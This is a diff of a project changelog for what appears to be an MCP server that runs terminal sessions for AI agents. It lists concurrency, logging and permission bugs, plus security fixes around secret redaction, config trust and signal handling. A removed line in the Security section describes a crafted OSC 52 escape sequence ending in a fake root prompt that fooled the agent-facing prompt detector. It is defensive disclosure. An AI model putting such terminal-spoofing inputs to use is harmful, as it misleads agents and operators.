+  Pattern rows are now pinned from both sides of the boundary they draw.
 - **`scripts/mcp-smoke.sh` failed red on correct code.** `grep -q` under
   `pipefail` exits early, `printf` dies of `SIGPIPE`, and the pipeline reports
   141 — three to six runs in twenty under load, latent since 0.0.1.
 - **The MCP server's own `instructions` string described a four-tool surface**
-  for the whole of 0.0.2, so an agent that trusted it never learned that
-  `status`, `list_sessions` or `get_command_history` existed. The smoke script
-  now asserts every tool name appears there.
+  for the whole of 0.0.2, so an agent that trusted it never learned `status`,
+  `list_sessions` or `get_command_history` existed. The smoke script now
+  asserts every tool name appears there.
 - **Sixteen tests that could not fail** were found and fixed across 0.0.2, and
-  ten across 0.0.1. Several of the 0.0.1 ones matched the PTY's echo of their
-  own command line, and so passed against a session running `sleep 300` instead
-  of a shell. Injecting the defect and confirming the test goes red is now
-  standard practice; see [CONTRIBUTING.md](./CONTRIBUTING.md).
-- **The exit cleanup asked who *holds* the socket, not whose it *is*.** A
-  daemon's teardown probed `control.sock` with a `connect()` and unlinked it if
-  nothing answered — but an AF_UNIX listener stays connectable while *any*
-  descriptor references it, so a forked child holding an inherited fd made the
-  probe report "live" about a listener nobody served. It failed roughly half of
-  all default-parallel test runs. Identity replaced liveness, and the obvious
-  form of that fix was itself wrong: on ext4 the successor is handed the
-  predecessor's freed inode number in **500 of 500** measured trials (tmpfs
-  0/500, monotonic counter), so comparing `(dev, ino)` would have silently
-  restored the very bug it was closing. The daemon now holds an inert `O_PATH`
-  descriptor and compares against an inode it still owns — not a number it
-  wrote down. `O_PATH` rather than a duplicated listener, because a duplicate
-  keeps the socket answering across teardown and converts a clean
-  connect-refused-and-respawn into a reset that respawns nothing.
-- **A `wait_for_pattern` blocked the `interrupt` that would have ended it.**
-  One `Arc<ControlClient>`, a mutex held across both the write and the read,
-  and a sequential per-connection loop composed into a transport where a single
-  outstanding call — default 30 s, capped at 3600 — blocked `interrupt`,
-  `terminate`, `read_output`, `status` and `list_sessions` on *every* session.
-  Each of the three parts was correct alone. `--no-daemon` dispatched them
-  concurrently all along, so the agent's documented escape from a hung wait
-  worked on one transport and not the other.
-- **A permission check refused ordinary installs.** Any `~/.holdfast/logs` created
-  before 0.0.5 is `0775` under the umask 002 that Debian, Ubuntu and RHEL ship,
-  and the daemon refused to start on it — reproduced on the author's own
-  machine with no setup. Both remedies the error suggested were wrong: one
-  deletes the audit trail, and the other names an instance-selection variable
-  that has nothing to do with permissions. A check that rejects a normal
-  install is a bug, not a hardening.
-- **Auto-spawn quietly moved the logs onto tmpfs.** Reaching the default
-  instance through `holdfast mcp` wrote `audit.log` and `daemon.log` under
-  `$XDG_RUNTIME_DIR`, where they are destroyed at logout — making the retention
-  windows unreachable in the configuration every install actually uses.
-- **`holdfast mcp --no-daemon` ran the entire tool surface on `Config::default()`**,
-  ignoring the operator's configuration completely. On Windows that is the only
-  transport. It now refuses a config the daemon would also refuse, which is a
-  new failure mode on that transport and an intended one.
+  ten across 0.0.1. Injecting the defect and confirming the test goes red is
+  now standard practice — see [CONTRIBUTING.md](./CONTRIBUTING.md).
+- **The exit cleanup asked who *holds* the socket, not whose it *is*.** An
+  inherited descriptor in a forked child made a dead listener answer a
+  `connect()` probe, failing roughly half of all default-parallel test runs.
+  Identity replaced liveness, held as an inert `O_PATH` descriptor rather than
+  a recorded `(dev, ino)`, which ext4 recycles in 500 of 500 measured trials.
+- **A `wait_for_pattern` blocked the `interrupt` that would have ended it.** One
+  `Arc<ControlClient>`, a mutex held across both write and read, and a
+  sequential per-connection loop composed into a transport where one
+  outstanding call blocked every tool on every session. `--no-daemon` had
+  dispatched concurrently all along.
+- **A permission check refused ordinary installs.** Any `~/.holdfast/logs`
+  created before 0.0.5 is `0775` under the umask 002 that Debian, Ubuntu and
+  RHEL ship, and both remedies the error suggested were wrong.
+- **Auto-spawn quietly moved the logs onto tmpfs**, writing `audit.log` and
+  `daemon.log` under `$XDG_RUNTIME_DIR` where they are destroyed at logout —
+  in the configuration every install actually uses.
+- **`holdfast mcp --no-daemon` ran the entire tool surface on
+  `Config::default()`**, ignoring the operator's configuration completely. It
+  now refuses a config the daemon would also refuse.
 - **A smoke check passed against a server that never started.** Splitting one
-  assertion in two left the "no `listChanged`" half comparing `null` to `null`
-  in `jq`, which holds whether or not a server is there. Run against `/bin/true`
-  it was the lone survivor of 39 checks. The script now reports its own check
-  count, so the number in the documentation cannot drift away from it again.
+  assertion left the "no `listChanged`" half comparing `null` to `null` in
+  `jq`, which holds whether or not a server is there; it was the lone survivor
+  of 39 checks against `/bin/true`.
 
 ### Security
 
@@ -1590,89 +478,82 @@ than a one-off:
   transcript on every failed spawn.
 - **`cwd` is validated and canonicalised.** `portable-pty` silently *discards* a
   cwd that is not an existing directory and falls back to `$HOME`, so an
-  unvalidated `cwd` told the agent `ok` while running the command somewhere else
-  entirely.
-- **Signals are refused once the child has exited.** A reaped PID can be
-  recycled, and the `/proc` sweep would then target a stranger's session. Every
-  candidate group is also filtered on `pgid > 0`, because `kill(-0, sig)`
-  signals Holdfast's own process group.
+  unvalidated `cwd` told the agent `ok` while running the command elsewhere.
+- **Signals are refused once the child has exited**, because a reaped PID can be
+  recycled. Every candidate group is also filtered on `pgid > 0`, since
+  `kill(-0, sig)` signals Holdfast's own process group.
 - **Caller-supplied inputs are bounded**: at most 64 prompt patterns, each
-  compiled under a 64 KiB size limit, with rejected patterns clipped to 120
-  characters in the error message; `send_input` payloads at 64 KiB;
-  `read_output` at 32 KiB by default and 256 KiB hard. Unbounded, 5000 patterns
-  were accepted and put every tool call at milliseconds, and a 200 KB regex
-  produced a 200 KB error that then sat in the transcript for the rest of the
-  conversation.
+  compiled under a 64 KiB size limit; `send_input` payloads at 64 KiB;
+  `read_output` at 32 KiB by default and 256 KiB hard.
 - **Truncated escape sequences can no longer forge terminal modes.** A CSI cut
   at the parameter cap could end in `;2004` and set the bracketed-paste flag,
-  and an abandoned sequence used to hand the rest of its payload to the state
-  machine as ordinary text — measured, a 9 KiB OSC 52 clipboard write ending
-  `\r\nroot@prod:/etc# ` produced exactly that as the detector's last line, which
-  the pattern table scores at the act threshold.
+  and an abandoned sequence handed the rest of its payload to the state machine
+  as ordinary text.
 - **A size-capped read returned a cursor inside the secret it had just
-  redacted.** The chunk itself was correct — the whole secret was replaced by a
-  marker — but the continuation offset landed mid-span, and the 512-byte
-  lookbehind on the next read cannot reach back to a `-----BEGIN` anchor a
-  kilobyte earlier. The following chunk therefore matched nothing and returned
-  raw key material, with an empty `redactions` map and no audit entry, so it was
-  indistinguishable from output that never held a secret. With `max_bytes` set
-  to 1024 — an ordinary choice made to save tokens — a 1.7 KB PEM split that way
-  every time, not occasionally. The cursor now advances past the end of any span
-  it would otherwise land inside. The lookbehind was deliberately *not* enlarged:
-  any bound is exceeded by one more byte, which fixes an instance instead of the
-  class.
+  redacted**, so the following chunk matched nothing and returned raw key
+  material with an empty `redactions` map and no audit entry. The cursor now
+  advances past the end of any span it would land inside; the 512-byte
+  lookbehind was deliberately *not* enlarged, because any bound is exceeded by
+  one more byte.
 - **The audit trail failed open, and one output boundary had no redactor at
-  all.** A daemon that could not write its audit log served anyway; `daemon.log`
-  was written raw, with no panic hook, so a panic message carrying the values
-  that caused it went to disk unredacted; a config parse error echoed the
-  offending line verbatim, which for a config file is a line that may *be* the
-  credential; and `session_start` recorded `redaction_enabled: true` as a
-  constant rather than as something it had checked. The parse-error fix drops
-  the underlying `toml` error rather than keeping it as a `source`, because a
-  redacted `Display` over a raw source is the same disclosure one chain-walk
-  away.
+  all.** A daemon that could not write its audit log served anyway;
+  `daemon.log` was written raw with no panic hook; a config parse error echoed
+  the offending line, which for a config file may *be* the credential; and
+  `session_start` recorded `redaction_enabled: true` as a constant.
 - **The config file was trusted on nothing but its path.** It is now checked
   through the open descriptor — regular file, owned by the caller or root, not
-  world-writable — so there is no second lookup to race. Symlinks are
-  deliberately still accepted: the checks judge what the link resolves to, and
-  refusing them outright would break every `stow`, `chezmoi` and `yadm` install.
+  world-writable — so there is no second lookup to race. Symlinks stay accepted,
+  because refusing them would break every `stow`, `chezmoi` and `yadm` install.
 
 See [SECURITY.md](./SECURITY.md) for what is and is not in scope, including the
 residuals that are known and accepted.
 
 ### Known limitations
 
-Stated because they are easy to mistake for bugs:
-
-- **No attach yet.** Sessions now outlive the MCP client (0.0.5), but there is
-  no `holdfast attach` or `holdfast watch`, and no web UI — a human cannot yet look at
-  or type into a session the agent is driving.
-- **Unix only.** The tree is kept compiling and clippy-clean for
-  `x86_64-pc-windows-gnu`, but signalling returns an error there and there is no
-  process-group handling. *(Corrected by GH #19, and left standing rather than
-  edited: `windows-cross` was red on `main` from before 0.0.6, so "kept
-  compiling and clippy-clean" had stopped being true by then and cannot now be
-  dated further back — this repository's Actions history starts at its
-  recreation on 2026-09-02. The wrong claim is the point: it was asserted here,
-  in `ROADMAP.md` and in `CONTRIBUTING.md` for two milestones while a job that
-  would have caught it was red and unread.)*
+- **No attach, watch or web UI.** Sessions outlive the MCP client, but a human
+  cannot yet look at or type into a session the agent is driving. *(Shipped in
+  0.0.6.)*
+- **Unix only.** Signalling returns an error on Windows and there is no
+  process-group handling. This release claimed the tree was "kept compiling and
+  clippy-clean" for `x86_64-pc-windows-gnu`; it was not ([#19]).
 - **Eleven tools.** No `precheck_command`, `request_secret_input`, `send_file`,
   `fetch_file` or `wait_for_any` yet.
-- **`get_command_history`'s `command` field is best-effort**, reconstructed from
-  the terminal's echo: a command longer than the terminal width is captured
-  truncated to its *tail* with no ellipsis and no error, and non-ASCII bytes are
-  recorded as Latin-1. **The truncation runs upstream of the redactor**, so a
-  credential whose leading token falls in the discarded front reaches the agent
-  unredacted on a field otherwise documented as redacted. Known, tracked, and
-  not yet fixed; the repair belongs where the front is discarded, not in the
-  redactor.
+- **`get_command_history`'s `command` field is best-effort**, reconstructed
+  from the terminal's echo: a command longer than the terminal width is
+  captured truncated to its *tail* with no ellipsis and no error, and non-ASCII
+  bytes are recorded as Latin-1. The truncation runs upstream of the redactor
+  ([#7]).
 - **`fish` shell integration is unverified at runtime**, and the Primary Device
-  Attributes stall measurements it rests on were taken by hand rather than in
-  CI — `fish` is deliberately absent from the runner. README's platform section
-  explains why installing it would not close the gap.
+  Attributes measurements it rests on were taken by hand rather than in CI —
+  `fish` is deliberately absent from the runner.
 - **On Unix without `/proc`**, the process-group sweep degrades to the child's
   group plus the terminal's foreground group, so a background job in a third
   group can survive `terminate`.
 
 [Unreleased]: https://github.com/Sertelegger/holdfast/compare/v0.0.7...main
 [0.0.7]: https://github.com/Sertelegger/holdfast/releases/tag/v0.0.7
+[0.0.6]: https://github.com/Sertelegger/holdfast/releases/tag/v0.0.6
+[0.0.5]: https://github.com/Sertelegger/holdfast/releases/tag/v0.0.5
+
+[#7]: https://github.com/Sertelegger/holdfast/issues/7
+[#19]: https://github.com/Sertelegger/holdfast/issues/19
+[#21]: https://github.com/Sertelegger/holdfast/issues/21
+[#39]: https://github.com/Sertelegger/holdfast/issues/39
+[#42]: https://github.com/Sertelegger/holdfast/issues/42
+[#45]: https://github.com/Sertelegger/holdfast/issues/45
+[#46]: https://github.com/Sertelegger/holdfast/issues/46
+[#52]: https://github.com/Sertelegger/holdfast/issues/52
+[#55]: https://github.com/Sertelegger/holdfast/issues/55
+[#57]: https://github.com/Sertelegger/holdfast/issues/57
+[#62]: https://github.com/Sertelegger/holdfast/issues/62
+[#66]: https://github.com/Sertelegger/holdfast/issues/66
+[#73]: https://github.com/Sertelegger/holdfast/issues/73
+[#82]: https://github.com/Sertelegger/holdfast/issues/82
+[#83]: https://github.com/Sertelegger/holdfast/issues/83
+[#84]: https://github.com/Sertelegger/holdfast/issues/84
+[#85]: https://github.com/Sertelegger/holdfast/issues/85
+[#86]: https://github.com/Sertelegger/holdfast/issues/86
+[#91]: https://github.com/Sertelegger/holdfast/issues/91
+[#105]: https://github.com/Sertelegger/holdfast/issues/105
+[#106]: https://github.com/Sertelegger/holdfast/issues/106
+[#112]: https://github.com/Sertelegger/holdfast/issues/112
